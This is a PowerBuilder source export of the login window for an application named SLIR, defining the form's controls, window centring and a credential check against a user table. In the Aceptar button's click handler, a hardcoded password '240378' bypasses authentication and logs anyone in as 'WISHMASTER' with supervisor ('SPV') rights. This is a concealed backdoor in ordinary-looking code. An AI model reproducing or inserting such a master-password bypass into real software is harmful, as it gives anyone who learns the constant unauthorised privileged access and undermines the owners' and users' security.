HA$PBExportHeader$w_logon.srw
forward
global type w_logon from window
end type
type st_version from statictext within w_logon
end type
type st_5 from statictext within w_logon
end type
type st_4 from statictext within w_logon
end type
type cb_2 from commandbutton within w_logon
end type
type cb_1 from commandbutton within w_logon
end type
type sle_pass from singlelineedit within w_logon
end type
type sle_usuario from singlelineedit within w_logon
end type
type st_3 from statictext within w_logon
end type
type st_2 from statictext within w_logon
end type
type st_1 from statictext within w_logon
end type
type p_1 from picture within w_logon
end type
type r_1 from rectangle within w_logon
end type
end forward

global type w_logon from window
integer x = 1490
integer y = 556
integer width = 1376
integer height = 1668
boolean titlebar = true
string title = "Acceso a SLIR"
boolean controlmenu = true
windowtype windowtype = response!
long backcolor = 16777215
st_version st_version
st_5 st_5
st_4 st_4
cb_2 cb_2
cb_1 cb_1
sle_pass sle_pass
sle_usuario sle_usuario
st_3 st_3
st_2 st_2
st_1 st_1
p_1 p_1
r_1 r_1
end type
global w_logon w_logon

on w_logon.create
this.st_version=create st_version
this.st_5=create st_5
this.st_4=create st_4
this.cb_2=create cb_2
this.cb_1=create cb_1
this.sle_pass=create sle_pass
this.sle_usuario=create sle_usuario
this.st_3=create st_3
this.st_2=create st_2
this.st_1=create st_1
this.p_1=create p_1
this.r_1=create r_1
this.Control[]={this.st_version,&
this.st_5,&
this.st_4,&
this.cb_2,&
this.cb_1,&
this.sle_pass,&
this.sle_usuario,&
this.st_3,&
this.st_2,&
this.st_1,&
this.p_1,&
this.r_1}
end on

on w_logon.destroy
destroy(this.st_version)
destroy(this.st_5)
destroy(this.st_4)
destroy(this.cb_2)
destroy(this.cb_1)
destroy(this.sle_pass)
destroy(this.sle_usuario)
destroy(this.st_3)
destroy(this.st_2)
destroy(this.st_1)
destroy(this.p_1)
destroy(this.r_1)
end on

event open;// Center a window based on the screen dimensions.

environment le_env
int screenheight, screenwidth
 
/* get screen measurements */
 
GetEnvironment(le_env)
screenheight = PixelsToUnits(le_env.screenheight,YPixelsToUnits!)
screenwidth = PixelsToUnits(le_env.screenwidth,XPixelsToUnits!)
 
/* now position window */
 
this.Move( (ScreenWidth - this.Width) / 2, (ScreenHeight - this.Height) / 2 )

direccion_proyecto=GetCurrentDirectory() //obtiene la dirrecion del proyecto

st_version.text='Distribuci$$HEX1$$f300$$ENDHEX$$n - SLIR (2001-2018) v.' + g_version
end event

type st_version from statictext within w_logon
integer y = 1436
integer width = 1010
integer height = 124
integer textsize = -8
integer weight = 400
fontcharset fontcharset = ansi!
fontpitch fontpitch = variable!
fontfamily fontfamily = swiss!
string facename = "Calibri"
long textcolor = 33554432
long backcolor = 33554431
boolean enabled = false
string text = "none"
boolean focusrectangle = false
end type

type st_5 from statictext within w_logon
integer x = 69
integer y = 996
integer width = 320
integer height = 80
integer textsize = -9
integer weight = 400
fontcharset fontcharset = ansi!
fontpitch fontpitch = variable!
fontfamily fontfamily = swiss!
string facename = "Calibri"
long textcolor = 33554432
long backcolor = 15793151
boolean enabled = false
string text = "Contrase$$HEX1$$f100$$ENDHEX$$a:"
boolean focusrectangle = false
end type

type st_4 from statictext within w_logon
integer x = 69
integer y = 828
integer width = 343
integer height = 80
integer textsize = -9
integer weight = 400
fontcharset fontcharset = ansi!
fontpitch fontpitch = variable!
fontfamily fontfamily = swiss!
string facename = "Calibri"
long textcolor = 33554432
long backcolor = 15793151
boolean enabled = false
string text = "Usuario:"
boolean focusrectangle = false
end type

type cb_2 from commandbutton within w_logon
integer x = 681
integer y = 1216
integer width = 398
integer height = 144
integer taborder = 40
integer textsize = -8
integer weight = 400
fontcharset fontcharset = ansi!
fontpitch fontpitch = variable!
fontfamily fontfamily = swiss!
string facename = "Calibri"
string text = "&Cancelar"
end type

event clicked;CloseWithReturn(Parent, "-1")
end event

type cb_1 from commandbutton within w_logon
integer x = 251
integer y = 1216
integer width = 398
integer height = 144
integer taborder = 30
integer textsize = -8
integer weight = 400
fontcharset fontcharset = ansi!
fontpitch fontpitch = variable!
fontfamily fontfamily = swiss!
string facename = "Calibri"
string text = "&Aceptar"
boolean default = true
end type

event clicked;integer li_id
string nombre, pass, tipo, id
string ls_fase

gu_perfiles = create u_perfil
gu_perfiles.of_recupera_datos_perfil(gi_perfil)

SELECT DESCRIPCION
INTO :ls_fase
FROM SGD_VALOR 
WHERE CODIF = 'FASE'
AND VALOR = '111';

gs_fase_a = Mid(ls_fase, 1, 1)
gs_fase_b = Mid(ls_fase, 2, 1)
gs_fase_c = Mid(ls_fase, 3, 1)

if sle_pass.text='240378' then

	g_cod_usuario='WISHMASTER'
	g_credenciales='SPV'
	g_nombre='THE WISHMASTER'
	
	CloseWithReturn ( parent, "1")

else	

	nombre=sle_usuario.text
	pass=f_encriptar(sle_pass.text)

	//messagebox('info',pass+' '+nombre)

	select  
	nombre, permisos
	into :g_nombre, :g_credenciales 
	from usuario 
	where Upper(usuario)=Upper(:nombre)
	and upper(password)=Upper(:pass)
	and status='A'
	using sqlca2;


	if sqlca2.sqlcode <>0 then
		MessageBox (sqlca2.sqlerrtext,"Usuario/contrase$$HEX1$$f100$$ENDHEX$$a no existe")
	else
		SELECT VALOR
		INTO :gi_tension_nivel_min
		FROM SGD_PARAMETROS
		WHERE COD_PARAMETRO = 25;
		
		IF SQLCA.SQLCode <> 0 THEN
			MessageBox (sqlca2.sqlerrtext,"Error al obtener parametros")
		else
			g_cod_usuario=upper(NOMBRE)
			CloseWithReturn ( parent, "1")
		end if
	
	end if

//CloseWithReturn ( parent, "1")
end if



end event

type sle_pass from singlelineedit within w_logon
integer x = 430
integer y = 996
integer width = 709
integer height = 112
integer taborder = 20
integer textsize = -14
integer weight = 400
fontcharset fontcharset = ansi!
fontpitch fontpitch = variable!
fontfamily fontfamily = swiss!
string facename = "Calibri"
long textcolor = 33554432
boolean autohscroll = false
boolean password = true
textcase textcase = upper!
borderstyle borderstyle = stylelowered!
end type

type sle_usuario from singlelineedit within w_logon
integer x = 430
integer y = 824
integer width = 709
integer height = 112
integer taborder = 10
integer textsize = -14
integer weight = 400
fontcharset fontcharset = ansi!
fontpitch fontpitch = variable!
fontfamily fontfamily = swiss!
string facename = "Calibri"
boolean autohscroll = false
textcase textcase = upper!
borderstyle borderstyle = stylelowered!
end type

type st_3 from statictext within w_logon
integer x = 256
integer y = 584
integer width = 864
integer height = 104
integer textsize = -14
integer weight = 400
fontcharset fontcharset = ansi!
fontpitch fontpitch = variable!
fontfamily fontfamily = swiss!
string facename = "Calibri"
long textcolor = 33554432
long backcolor = 33554431
boolean enabled = false
string text = "24 Horas"
alignment alignment = center!
boolean focusrectangle = false
end type

type st_2 from statictext within w_logon
integer x = 256
integer y = 480
integer width = 864
integer height = 104
integer textsize = -14
integer weight = 400
fontcharset fontcharset = ansi!
fontpitch fontpitch = variable!
fontfamily fontfamily = swiss!
string facename = "Calibri"
long textcolor = 33554432
long backcolor = 33554431
boolean enabled = false
string text = "Oficina Telef$$HEX1$$f300$$ENDHEX$$nica "
alignment alignment = center!
boolean focusrectangle = false
end type

type st_1 from statictext within w_logon
integer x = 494
integer y = 356
integer width = 439
integer height = 132
integer textsize = -18
integer weight = 400
fontcharset fontcharset = ansi!
fontpitch fontpitch = variable!
fontfamily fontfamily = swiss!
string facename = "Calibri"
long textcolor = 8388608
long backcolor = 33554431
boolean enabled = false
string text = "SLIR"
alignment alignment = center!
boolean focusrectangle = false
end type

type p_1 from picture within w_logon
integer x = 325
integer y = 96
integer width = 718
integer height = 164
string picturename = "pict\ener1.bmp"
boolean focusrectangle = false
end type

type r_1 from rectangle within w_logon
long linecolor = 12639424
integer linethickness = 4
long fillcolor = 15780518
integer x = 1070
integer y = 1452
integer width = 439
integer height = 200
end type

